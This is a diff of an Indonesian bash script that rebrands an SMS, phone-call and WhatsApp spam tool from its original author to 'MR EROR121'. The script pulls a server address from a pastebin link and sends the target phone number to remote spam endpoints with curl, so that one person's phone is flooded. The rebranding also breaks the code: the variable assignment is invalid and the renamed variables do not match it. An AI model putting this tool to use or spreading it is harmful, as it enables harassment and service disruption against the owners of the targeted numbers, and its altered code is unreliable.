@@ -1,32 +1,24 @@
+ 
 #!/bin/bash
 #///////////////////////////////////////////////////////////////////////////////
-#            Jangan lupa subscribe channel HelloBae (Hackbae)                  #
-#                 https://www.youtube.com/c/hellobae                           #
+#            Jangan lupa subscribe channel MR EROR121                          #
+#                AUTHOR: MR EROR121                                            #
 #///////////////////////////////////////////////////////////////////////////////
 #///////////////////////////////////////////////////////////////////////////////
-#////                       _            _  __                              ////
-#////                      | |          (_)/ _|                             ////
-#////                   ___| |_   _  ___ _| |_ ___ _ __                     ////
-#////                  |_  / | | | |/ __| |  _/ _ \ '__|                    ////
-#////                   / /| | |_| | (__| | ||  __/ |                       ////
-#////                  /___|_|\__,_|\___|_|_| \___|_|                       ////
-#////                                                                       ////
+MR EROR121="GUNAKANLAH DENGAN BIJAK DAN ADMIN TIDAK AKAN BERTANGGUNG JAWAB"
 #///////////////////////////////////////////////////////////////////////////////
-#///////////////////////////////////////////////////////////////////////////////
-zlucifer="Jangan lupa subscribe channel HelloBae (Hackbae) https://www.youtube.com/c/hellobae"
-#///////////////////////////////////////////////////////////////////////////////
-#PERINGATAN : KESALAHAN ATAU KEJAHATAN ADALAH TANGGUNG JAWAB DARI PEMAKAI
+#NOTE : KESALAHAN ATAU KEJAHATAN ADALAH TANGGUNG JAWAB DARI PEMAKAI
 #GUNAKAN TOOLS UNTUK KEBAIKAN JANGAN DISALAH GUNAKAN :)
 troll(){
-    echo "================================================"
-    echo "=  _____        _ _ ___          _        _    ="
-    echo "= |_   _| _ ___| | | _ \_ _ ___ (_)___ __| |_  ="
-    echo "=   | || '_/ _ \ | |  _/ '_/ _ \| / -_) _|  _| ="
-    echo "=   |_||_| \___/_|_|_| |_| \___// \___\__|\__| ="
-    echo "=                             |__/             ="
-    echo "================================================"
-    echo "               Troll Project v2.0"
-    echo "================================================"
+    echo "=========================================================="
+    echo "=      __  __ ____    _____ ____   ___  ____  _ ____  _   ="
+    echo "=      |  \/  |  _ \  | ____|  _ \ / _ \|  _ \/ |___ \/ | ="
+    echo "=      | |\/| | |_) | |  _| | |_) | | | | |_) | | __) | | ="
+    echo "=      | |  | |  _ <  | |___|  _ <| |_| |  _ <| |/ __/| | ="
+    echo "=      |_|  |_|_| \_\ |_____|_| \_\\___/|_| \_\_|_____|_| ="
+    echo "==========================================================="
+    echo "                  MR EROR121 SPAM CALL"
+    echo "==========================================================="
 }
 server=$(curl -s https://pastebin.com/raw/DhQB56dd)
 loading(){
@@ -42,7 +34,7 @@ loading(){
     echo -e "\n"
 }
 mulai(){
-    echo "Gunakan Troll Project Lagi?"
+    echo "Gunakan Tool Spam lagi ?"
     echo "y/n?"
     echo
     read lagi
@@ -51,7 +43,7 @@ mulai(){
     else
           clear
           troll
-          echo "Terimakasih sudah menggunakan Troll project"
+          echo "Terimakasih sudah menggunakan Tool MR EROR121"
           close
     fi
 }
@@ -69,7 +61,7 @@ spam(){
     echo "[1] Spam SMS"
     echo "[2] Spam Telp"
     echo "[3] Spam WhatsApp"
-    echo "[4] Close Troll Project"
+    echo "[4] Close Tool Mr Eror121"
     echo
     echo "1/2/3/4?"
     read pilih
@@ -103,12 +95,12 @@ spam(){
                 echo
                 echo "Jangan close aplikasi sebelum spam selesai"
                 echo "========================================"
-                cek_target=`curl -A "$zlucifer" -s $server/api_sms.php?nomor=$target"&paket="$paket`
+                cek_target=`curl -A "$Mr Eror121" -s $server/api_sms.php?nomor=$target"&paket="$paket`
                 echo -e $cek_target
                 echo " Gunakan tools dengan bijak"
                 echo
                 echo " Love u always "
-                echo " -zLucifer"
+                echo " -MR EROR121"
                 echo "========================================"
         else
                 echo "Kesalahan"
@@ -121,7 +113,7 @@ spam(){
         loading
         clear
         troll
-        echo "Troll Spam Telp"
+        echo "Tool Spam Telp"
         echo
         echo "Silahkan masukan nomor telp target"
         echo contoh 0812345678
@@ -152,12 +144,12 @@ spam(){
                   echo
                   echo "Jangan close aplikasi sebelum spam selesai"
                   echo "========================================"
-                  cek_target=`curl -A "$zlucifer" -s $server/api_call.php?nomor=$target"&method="$api_spam`
+                  cek_target=`curl -A "$Mr Eror121" -s $server/api_call.php?nomor=$target"&method="$api_spam`
                   echo -e $cek_target
                   echo " Gunakan tools dengan bijak"
                   echo
                   echo " Love u always "
-                  echo " -zLucifer"
+                  echo " -zMR EROR121"
                   echo "========================================"
         else
                   echo Kesalahan, silahkan coba lagi
@@ -193,12 +185,12 @@ spam(){
                 echo
                 echo "Jangan close aplikasi sebelum spam selesai"
                 echo "========================================"
-                cek_target=`curl -A "$zlucifer" -s $server/api_wa.php?nomor=$target"&paket="$paket`
+                cek_target=`curl -A "$MR EROR1WQ" -s $server/api_wa.php?nomor=$target"&paket="$paket`
                 echo -e $cek_target
                 echo " Gunakan tools dengan bijak"
                 echo
                 echo " Love u always "
-                echo " -zLucifer"
+                echo " -MR EROR121"
                 echo "========================================"
         else
                 echo "Kesalahan"
@@ -208,7 +200,7 @@ spam(){
         #tutup
         clear
         troll
-        echo "Terimakasih sudah menggunakan Troll project"
+        echo "Terimakasih sudah menggunakan Tool Mr Eror121"
         close
     else
         clear
@@ -232,6 +224,6 @@ read confirm
 if [ $confirm = "y" ] || [ $confirm = "Y" ] ; then
     spam
 else
-    echo "Terimakasih sudah menggunakan Troll project"
+    echo "Terimakasih sudah menggunakan Tool Mr Eror121"
     close
 fi
